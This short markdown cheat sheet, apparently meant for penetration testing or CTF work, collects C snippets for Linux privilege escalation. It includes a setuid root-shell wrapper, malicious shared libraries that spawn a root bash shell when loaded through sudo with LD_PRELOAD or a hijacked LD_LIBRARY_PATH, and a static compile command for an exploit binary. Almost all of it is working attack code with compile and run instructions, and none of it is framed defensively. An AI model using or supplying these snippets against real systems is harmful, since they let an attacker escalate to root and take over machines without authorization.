# C++ Snippets Utils

### Set UID and GID

```cpp
#include<unistd.h>
void main(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

### Preload library with `LD_PRELOAD`

```cpp
/* 
Compile: gcc -fPIC -shared -nostartfiles -o preload.so preload.c
Run: sudo LD_PRELOAD=./preload.so program-name-here
 */
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

### Preload library with `LD_LIBRARY_PATH`

```cpp
/*
Look for some lib: ldd /your/app/here
Compile: gcc -o /lib/found/with/ldd/lib-name.so.1 -shared -fPIC ./library_path.c
Run: sudo LD_LIBRARY_PATH=. /your/app/here
*/
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

### Compile without dependency of GLIBC_2.XX

```bash
gcc exploit.c -o exploit -w -static
```